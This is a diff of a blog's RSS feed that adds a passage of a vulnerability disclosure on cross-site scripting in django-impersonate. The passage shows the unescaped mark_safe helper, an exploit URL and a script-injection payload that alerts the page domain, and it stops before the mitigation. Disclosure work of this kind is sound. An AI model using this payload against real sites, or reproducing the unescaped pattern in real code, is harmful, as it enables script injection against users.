@@ -1,5 +1,310 @@
 <?xml version="1.0" encoding="utf-8"?>
-<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Santos Gallegos (Posts about django)</title><link>https://stsewd.dev/</link><description></description><atom:link href="https://stsewd.dev/categories/django.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><copyright>Contents © 2025 &lt;a href="mailto:stsewd@proton.me"&gt;Santos Gallegos&lt;/a&gt; </copyright><lastBuildDate>Sat, 08 Feb 2025 21:29:24 GMT</lastBuildDate><generator>Nikola (getnikola.com)</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>XSS in django-allauth 0.63.5</title><link>https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/</link><dc:creator>Santos Gallegos</dc:creator><description>&lt;p&gt;This post details a Cross-Site Scripting (XSS) vulnerability I discovered in &lt;a class="reference external" href="https://allauth.org/"&gt;django-allauth&lt;/a&gt;, a popular Django package for authentication.
+<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Santos Gallegos (Posts about django)</title><link>https://stsewd.dev/</link><description></description><atom:link href="https://stsewd.dev/categories/django.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><copyright>Contents © 2025 &lt;a href="mailto:stsewd@proton.me"&gt;Santos Gallegos&lt;/a&gt; </copyright><lastBuildDate>Sun, 09 Feb 2025 04:44:59 GMT</lastBuildDate><generator>Nikola (getnikola.com)</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>XSS in django-impersonate 1.9.3 and django-gravatar2 1.4.4</title><link>https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/</link><dc:creator>Santos Gallegos</dc:creator><description>&lt;p&gt;This post details two cross-site scripting (XSS) vulnerabilities I discovered in &lt;a class="reference external" href="https://pypi.org/project/django-impersonate/"&gt;django-impersonate&lt;/a&gt;,
+and &lt;a class="reference external" href="https://pypi.org/project/django-gravatar2/"&gt;django-gravatar2&lt;/a&gt;.
+I'm writing about them together because they share the same vulnerability,
+and are similar in other aspects that I'll explain below.&lt;/p&gt;
+&lt;nav class="contents local" id="contents" role="doc-toc"&gt;
+&lt;p class="topic-title"&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#top"&gt;Contents&lt;/a&gt;&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#background" id="toc-entry-1"&gt;Background&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#django-impersonate" id="toc-entry-2"&gt;django-impersonate&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#the-vulnerability" id="toc-entry-3"&gt;The vulnerability&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#exploitation" id="toc-entry-4"&gt;Exploitation&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#proof-of-concept" id="toc-entry-5"&gt;Proof of concept&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#mitigation" id="toc-entry-6"&gt;Mitigation&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#timeline" id="toc-entry-7"&gt;Timeline&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#django-gravatar2" id="toc-entry-8"&gt;django-gravatar2&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#the-vulnerability-1" id="toc-entry-9"&gt;The vulnerability&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#exploitation-1" id="toc-entry-10"&gt;Exploitation&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#proof-of-concept-1" id="toc-entry-11"&gt;Proof of concept&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#mitigation-1" id="toc-entry-12"&gt;Mitigation&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#timeline-1" id="toc-entry-13"&gt;Timeline&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#more-in-common-than-you-think" id="toc-entry-14"&gt;More in common than you think&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference internal" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#acknowledgements" id="toc-entry-15"&gt;Acknowledgements&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/nav&gt;
+&lt;section id="background"&gt;
+&lt;h2&gt;Background&lt;/h2&gt;
+&lt;p&gt;At &lt;a class="reference external" href="https://about.readthedocs.com/"&gt;Read the Docs&lt;/a&gt;, we use both packages.
+While waiting for my PRs to be reviewed, and taking a break from coding,
+I decided to do a quick security audit of some of our dependencies,
+since both packages have a relatively small codebase,
+they were good candidates for a quick review.&lt;/p&gt;
+&lt;/section&gt;
+&lt;section id="django-impersonate"&gt;
+&lt;h2&gt;django-impersonate&lt;/h2&gt;
+&lt;p&gt;&lt;a class="reference external" href="https://pypi.org/project/django-impersonate/"&gt;django-impersonate&lt;/a&gt; allows you to impersonate other users,
+really useful for debugging and support.&lt;/p&gt;
+&lt;section id="the-vulnerability"&gt;
+&lt;h3&gt;The vulnerability&lt;/h3&gt;
+&lt;p&gt;After grepping the codebase for common vulnerable patterns,
+I found &lt;a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/helpers.py?rev=fa5d1a703960#L28"&gt;this line of code&lt;/a&gt; that caught my attention:&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code python"&gt;&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-1" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-1"&gt;&lt;/a&gt;&lt;span class="k"&gt;def&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;get_redir_field&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-2" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-2"&gt;&lt;/a&gt;    &lt;span class="n"&gt;redirect_field_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;REDIRECT_FIELD_NAME&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-3" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-3"&gt;&lt;/a&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;redirect_field_name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-4" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-4" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-4"&gt;&lt;/a&gt;        &lt;span class="n"&gt;nextval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;redirect_field_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-5" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-5" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-5"&gt;&lt;/a&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;nextval&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-6" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-6" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-6"&gt;&lt;/a&gt;            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;mark_safe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-7" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-7" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-7"&gt;&lt;/a&gt;               &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;'&amp;lt;input type="hidden" name="&lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s1"&gt;" value="&lt;/span&gt;&lt;span class="si"&gt;{1}&lt;/span&gt;&lt;span class="s1"&gt;"/&amp;gt;'&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-8" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-8" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-8"&gt;&lt;/a&gt;                  &lt;span class="n"&gt;redirect_field_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nextval&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-9" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-9" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-9"&gt;&lt;/a&gt;               &lt;span class="p"&gt;)&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-10" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-10" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-10"&gt;&lt;/a&gt;            &lt;span class="p"&gt;)&lt;/span&gt;
+&lt;a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-11" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-11" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_8ceac69f9b864d7399bf95229f24ee74-11"&gt;&lt;/a&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;''&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You can see that the application is building an HTML input field with the value of a query parameter (if the &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;IMPERSONATE["REDIRECT_FIELD_NAME"]&lt;/span&gt;&lt;/code&gt; setting is defined),
+and marking it as safe with &lt;a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.safestring.mark_safe"&gt;mark_safe&lt;/a&gt;
+(Django won't escape it when including it in a template).
+The problem arises as the query parameter is controlled by the user, and isn't escaped before being included in the string.&lt;/p&gt;
+&lt;/section&gt;
+&lt;section id="exploitation"&gt;
+&lt;h3&gt;Exploitation&lt;/h3&gt;
+&lt;p&gt;Searching for the usage of the &lt;code class="docutils literal"&gt;get_redir_field&lt;/code&gt; function,
+I found it was used in two views related to listing users:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/views.py?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L106"&gt;/impersonate/views.py:106 (list_users)&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/views.py?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L134"&gt;/impersonate/views.py:134 (search_users)&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;But only the &lt;a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/templates/impersonate/search_users.html?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L11"&gt;template&lt;/a&gt;
+rendered from the &lt;code class="docutils literal"&gt;search_users&lt;/code&gt; view includes the result of the function.&lt;/p&gt;
+&lt;!-- rstcheck: ignore-next-code-block --&gt;
+&lt;div class="code"&gt;&lt;pre class="code python"&gt;&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-1" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-1"&gt;&lt;/a&gt;&lt;span class="c1"&gt;# impersonate/views.py (search_users)&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-2" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-2"&gt;&lt;/a&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-3" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-3"&gt;&lt;/a&gt;    &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-4" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-4" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-4"&gt;&lt;/a&gt;    &lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-5" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-5" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-5"&gt;&lt;/a&gt;    &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-6" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-6" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-6"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'users'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-7" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-7" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-7"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'paginator'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;paginator&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-8" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-8" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-8"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'page'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-9" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-9" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-9"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'page_number'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;page_number&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-10" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-10" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-10"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'query'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-11" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-11" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-11"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'redirect'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;get_redir_arg&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-12" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-12" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-12"&gt;&lt;/a&gt;        &lt;span class="s1"&gt;'redirect_field'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;get_redir_field&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-13" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-13" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-13"&gt;&lt;/a&gt;    &lt;span class="p"&gt;},&lt;/span&gt;
+&lt;a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-14" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-14" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_93669693abc74e61a26a88f38e8ce4cd-14"&gt;&lt;/a&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-1" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-1"&gt;&lt;/a&gt;&lt;span class="cm"&gt;&amp;lt;!-- impersonate/templates/impersonate/search_users.html --&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-2" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-2"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"{% url 'impersonate-search' %}"&lt;/span&gt; &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"GET"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-3" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-3"&gt;&lt;/a&gt;   Enter Search Query:&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-4" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-4" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-4"&gt;&lt;/a&gt;   &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"text"&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"q"&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"{% if query %}{{ query }}{% endif %}"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-5" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-5" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-5"&gt;&lt;/a&gt;   {{redirect_field}}
+&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-6" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-6" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-6"&gt;&lt;/a&gt;   &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"submit"&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"Search"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-7" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-7" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d29cf2a0a1554423bf40b728b1e02c39-7"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Assuming the application defined the &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;IMPERSONATE["REDIRECT_FIELD_NAME"]&lt;/span&gt;&lt;/code&gt; setting as &lt;code class="docutils literal"&gt;next&lt;/code&gt;,
+the URL used to exploit the vulnerability would be &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;/impersonate/search/?next={payload}&lt;/span&gt;&lt;/code&gt;.
+Where &lt;code class="docutils literal"&gt;{payload}&lt;/code&gt; can be:&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_6d5fccd15a854af68e8d5c0ed7a77daa-1" name="rest_code_6d5fccd15a854af68e8d5c0ed7a77daa-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_6d5fccd15a854af68e8d5c0ed7a77daa-1"&gt;&lt;/a&gt;"/&amp;gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"hidden&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;What this does is:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;Uses a &lt;code class="docutils literal"&gt;"/&amp;gt;&lt;/code&gt; to close the &lt;code class="docutils literal"&gt;input&lt;/code&gt; tag.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Injects a script that shows an alert with the current domain.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Opens a new tag so the rest of the HTML is not shown as broken.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The payload injected into the template would look like this:&lt;/p&gt;
